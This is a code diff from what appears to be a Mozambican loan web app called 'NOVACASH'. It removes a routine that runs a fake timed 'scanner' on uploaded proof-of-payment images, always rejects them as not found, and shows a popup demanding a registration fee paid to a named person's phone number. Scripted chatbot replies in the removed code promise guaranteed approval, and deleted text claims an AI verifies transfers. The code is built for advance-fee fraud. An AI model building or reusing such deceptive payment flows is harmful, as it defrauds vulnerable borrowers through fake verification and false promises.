-            const readerProof = new FileReader();
-            readerProof.onload = function(e) {
-                clearTimeout(proofTimeout);
-                proofImageData = e.target.result;
-                const startTime = Date.now();
-                const interval = setInterval(() => {
-                    const elapsedMs = Date.now() - startTime;
-                    const percent = Math.min((elapsedMs / (totalSeconds * 1000)) * 100, 100);
-                    loading.update(percent);
-                    loading.updateTimer(Math.max(0, Math.ceil((totalSeconds * 1000 - elapsedMs) / 1000)));
-                    if (!scannerShown && percent >= 48 && proofImageData) {
-                        scannerShown = true;
-                        loading.showScanner(proofImageData);
-                    }
-                    if (percent >= 100) {
-                        clearInterval(interval);
-                        setTimeout(() => {
-                            loading.hide();
-
-                            // ALTERAÇÃO #5/#7: registar tentativa falhada
-                            const state = registerFailedAttempt();
-                            const clientName = currentUser ? currentUser.fullName : 'Cliente';
-                            const loanAmount = parseInt(simAmount.value) || 0;
-                            const feeValue = calcFee(loanAmount);
-
-                            // registar rejeição no histórico (Alteração #4)
-                            if (currentUser) {
-                                if (!currentUser.loans) currentUser.loans = [];
-                                currentUser.loans.push({
-                                    amount: loanAmount,
-                                    term: parseInt(simTerm.value) || 6,
-                                    status: 'rejected',
-                                    reason: 'Comprovativo de pagamento da taxa de inscrição não encontrado no sistema.',
-                                    date: new Date().toISOString(),
-                                    rejectedAt: new Date().toISOString()
-                                });
-                                const idx = users.findIndex(u => u.phone === currentUser.phone);
-                                if (idx !== -1) users[idx] = currentUser;
-                                saveUsers();
-                                sessionStorage.setItem('novacash_session', JSON.stringify(currentUser));
-                                updateHistory();
-                                updateHistoryRejectBadges();
-                            }
-
-                            // som de erro
-                            playErrorSound();
-
-                            // mostrar popup detalhado (Alteração #4)
-                            showErrorPopupWithButtons({
-                                clientName,
-                                feeValue,
-                                attempts: state.attempts,
-                                maxAttempts: TRIAL_MAX,
-                                blockedUntil: state.blockedUntil
-                            });
-
-                            // registar notificação
-                            if (currentUser) {
-                                const now = new Date();
-                                const formattedDate = `${String(now.getDate()).padStart(2,'0')}/${String(now.getMonth()+1).padStart(2,'0')}/${now.getFullYear()} às ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}`;
-                                addNotif(
-                                    currentUser,
-                                    '❌ Erro na imagem de confirmação',
-                                    `senhor(a) ${clientName}, não foi possível validar a imagem do comprovativo. Valor da taxa: ${feeValue.toLocaleString('pt-MZ')} MT. Tentativa ${state.attempts}/${TRIAL_MAX}. Data: ${formattedDate}`,
-                                    'error',
-                                    'fa-exclamation-triangle'
-                                );
-                            }
-
-                            // atualizar UI de tentativas/bloqueio
-                            updateTrialUI();
-
-                            reject(new Error('Comprovativo não validado.'));
-                        }, 400);
-                    }
-                }, 50);
-            };
-            readerProof.onerror = function() {
-                clearTimeout(proofTimeout);
-                loading.hide();
-                reject(new Error('Erro ao ler o comprovativo.'));
-            };
-            readerProof.readAsDataURL(proofFile);
-        });
-    }
-
-    // ============================================================
-    // ALTERAÇÃO #4/#7: POPUP DE ERRO DETALHADO
-    // ============================================================
-    function showErrorPopupWithButtons(info) {
-        const popup = document.getElementById('notifPopup');
-        popup.classList.add('error-modal-improved');
-        const attemptsText = `${info.attempts} / ${info.maxAttempts}`;
-        const isBlocked = info.blockedUntil && info.blockedUntil > Date.now();
-        const blockNotice = isBlocked
-            ? `<div style="background:rgba(239,68,68,0.08);border-radius:8px;padding:0.5rem 0.7rem;margin-top:0.5rem;font-size:0.75rem;color:#991B1B;border:1px solid rgba(239,68,68,0.2);">
-                   ⛔ Limite de tentativas atingido. O envio ficará bloqueado durante 30 minutos.
-               </div>`
-            : '';
-        popup.innerHTML = `
-            <button class="close-popup" id="popupClose" aria-label="Fechar">&times;</button>
-            <div class="error-modal-header">
-                <div class="error-modal-icon"><i class="fas fa-exclamation-triangle"></i></div>
-                <div>
-                    <h3 class="error-modal-title">❌ ERRO NA IMAGEM DO COMPROVATIVO DE PAGAMENTO</h3>
-                    <span class="error-modal-subtitle">Ação necessária</span>
-                </div>
-            </div>
-            <div class="error-modal-body">
-                <p class="error-modal-message">Senhor(a) <strong>${info.clientName}</strong>, não foi possível validar a imagem do comprovativo de pagamento da taxa de inscrição.</p>
-                <p class="error-modal-message" style="margin-top:0.4rem;"><strong>Motivo:</strong> Comprovativo não encontrado no sistema.</p>
-                <p class="error-modal-message" style="margin-top:0.4rem;">Por favor, verifique a imagem e volte a tentar, caso ainda tenha tentativas disponíveis.</p>
-            </div>
-            <div class="error-modal-details">
-                <div class="detail-row">
-                    <span class="detail-label">Valor da taxa de inscrição:</span>
-                    <span class="detail-value fee">${info.feeValue.toLocaleString('pt-MZ')} MT</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Tentativas utilizadas:</span>
-                    <span class="detail-value attempts">${attemptsText}</span>
-                </div>
-            </div>
-            <div class="error-modal-payment-box">
-                <div class="payment-box-title">📱 Dados de pagamento</div>
-                <div class="payment-box-row"><span class="pb-label">Número:</span><span class="pb-value">876364927</span></div>
-                <div class="payment-box-row"><span class="pb-label">Nome de confirmação:</span><span class="pb-value">TIOFELO EDSON LUIS JAIELA</span></div>
-            </div>
-            ${blockNotice}
-            <div class="error-modal-actions">
-                <button class="btn-error primary" id="errorBtnEntendi">
-                    <i class="fas fa-check-circle"></i> Entendi, vou pagar
-                </button>
-                <button class="btn-error secondary" id="errorBtnSaibaMais">
-                    <i class="fas fa-info-circle"></i> Saiba mais
-                </button>
-            </div>
-            <div class="error-modal-extra" id="errorExtraOptions" style="display:none;">
-                <button class="btn-error secondary" id="errorBtnPorque">❓ Porque pagar a taxa de inscrição?</button>
-                <button class="btn-error secondary" id="errorBtnNaoAprovado">❓ O que acontece quando pagar a taxa e não ser aprovado?</button>
-            </div>
-        `;
-        popup.classList.add('show');
-
-        const closePopup = () => {
-            popup.classList.remove('show');
-            popup.classList.remove('error-modal-improved');
-        };
-
-        document.getElementById('popupClose').addEventListener('click', closePopup);
-        document.getElementById('errorBtnEntendi').addEventListener('click', closePopup);
-
-        document.getElementById('errorBtnSaibaMais').addEventListener('click', function() {
-            const extra = document.getElementById('errorExtraOptions');
-            if (!extra) return;
-            extra.style.display = (extra.style.display === 'none' || !extra.style.display) ? 'flex' : 'none';
-        });
-
-        document.getElementById('errorBtnPorque').addEventListener('click', function() {
-            closePopup();
-            const chatWindowEl = document.getElementById('chatWindowApp');
-            chatWindowEl.classList.add('active');
-            const chatMessagesEl = document.getElementById('chatMessagesApp');
-            const msg = document.createElement('div');
-            msg.className = 'msg user';
-            msg.textContent = 'Para que serve a taxa de inscrição?';
-            chatMessagesEl.appendChild(msg);
-            chatMessagesEl.scrollTop = chatMessagesEl.scrollHeight;
-            const typing = document.createElement('div');
-            typing.className = 'msg bot';
-            typing.innerHTML = `<span class="msg-sender">🤖 NOVACASH</span><div class="typing-dots"><span></span><span></span><span></span></div>`;
-            chatMessagesEl.appendChild(typing);
-            chatMessagesEl.scrollTop = chatMessagesEl.scrollHeight;
-            setTimeout(() => {
-                typing.remove();
-                const response = document.createElement('div');
-                response.className = 'msg bot';
-                // ALTERAÇÃO #6: explicação clara (taxa NÃO descontada)
-                response.innerHTML = `<span class="msg-sender">🤖 NOVACASH</span>📝 PARA QUE SERVE A TAXA DE INSCRIÇÃO? 🤔
-
-A taxa de inscrição é um pagamento SEPARADO e NÃO é descontada nem deduzida do valor do empréstimo solicitado.
-
-Ela destina-se a cobrir os custos administrativos e operacionais da análise de crédito e do processamento da sua solicitação.
-
-⚠️ Importante:
-• O valor da taxa depende do montante solicitado, de acordo com a tabela da plataforma.
-• O valor aplicável é apresentado antes de efetuar o pagamento.
-`;
-                chatMessagesEl.appendChild(response);
-                chatMessagesEl.scrollTop = chatMessagesEl.scrollHeight;
-            }, 1500);
-            showToast('📝 Explicação sobre a taxa de inscrição aberta no chat.', 'info');
-        });
-
-        document.getElementById('errorBtnNaoAprovado').addEventListener('click', function() {
-            closePopup();
-            const chatWindowEl = document.getElementById('chatWindowApp');
-            chatWindowEl.classList.add('active');
-            const chatMessagesEl = document.getElementById('chatMessagesApp');
-            const msg = document.createElement('div');
-            msg.className = 'msg user';
-            msg.textContent = 'O que acontece quando pagar a taxa e não ser aprovado?';
-            chatMessagesEl.appendChild(msg);
-            chatMessagesEl.scrollTop = chatMessagesEl.scrollHeight;
-            const typing = document.createElement('div');
-            typing.className = 'msg bot';
-            typing.innerHTML = `<span class="msg-sender">🤖 NOVACASH</span><div class="typing-dots"><span></span><span></span><span></span></div>`;
-            chatMessagesEl.appendChild(typing);
-            chatMessagesEl.scrollTop = chatMessagesEl.scrollHeight;
-            setTimeout(() => {
-                typing.remove();
-                const response = document.createElement('div');
-                response.className = 'msg bot';
-                response.innerHTML = `<span class="msg-sender">🤖 NOVACASH</span>Ao cumprir com os requisitos exigidos na plataforma, sempre serás aprovado. O importante é verificar no seu cartão onde aparece o seu saldo em dívida se foste verificado. Tens que usar um cartão Vodacom ou Movitel que já esteja em uso há mais de 2 anos e também usar o mesmo documento que foi usado no registo do seu cartão. Com a NOVACASH, o cliente é aprovado em 8 a 30 minutos no máximo. Boa solicitação!
-
-Em caso de o cliente ter falhado em algum dos requisitos exigidos, pode solicitar o reembolso do valor entrando em contacto com o seguinte número: 876364927.`;
-                chatMessagesEl.appendChild(response);
-                chatMessagesEl.scrollTop = chatMessagesEl.scrollHeight;
-            }, 1500);
-            showToast('📝 Explicação sobre aprovação e reembolso aberta no chat.', 'info');
-        });
-    }
 
     // Char counter
     document.getElementById('reviewCommentInput')?.addEventListener('input', function() {
@@ -5202,13 +4552,9 @@ Para solicitar o seu empréstimo, siga as seguintes instruções: primeiro, cliq
 
 Preencha todos os dados exigidos, incluindo os seus dados pessoais, a fotografia frontal e traseira do seu Bilhete de Identidade ou outro documento de identificação aceite pela plataforma.
 
-Depois, escolha o valor do empréstimo que pretende solicitar. Os empréstimos da NOVACASH começam a partir de cinco mil meticais e podem chegar até trezentos mil meticais. A taxa de inscrição varia de acordo com o valor do empréstimo solicitado.
+Depois, escolha o valor do empréstimo que pretende solicitar. Os empréstimos da NOVACASH começam a partir de cinco mil meticais e podem chegar até trezentos mil meticais. 
 
-Depois de efetuar o pagamento da taxa de inscrição, envie a captura de ecrã, ou screenshot, da mensagem de confirmação da transferência através da opção 'Enviar comprovativo'.
-
-A nossa inteligência artificial irá verificar a transferência no nosso sistema e avaliar a mensagem de confirmação enviada.
-
-Se todas as informações estiverem corretas e a transferência for confirmada, receberá o seu empréstimo dentro de oito a trinta minutos, no máximo.
+No final, reveja os dados apresentados no resumo e clique em “Concluir Solicitação” para continuar.
 
 Boa solicitação,`;
     }
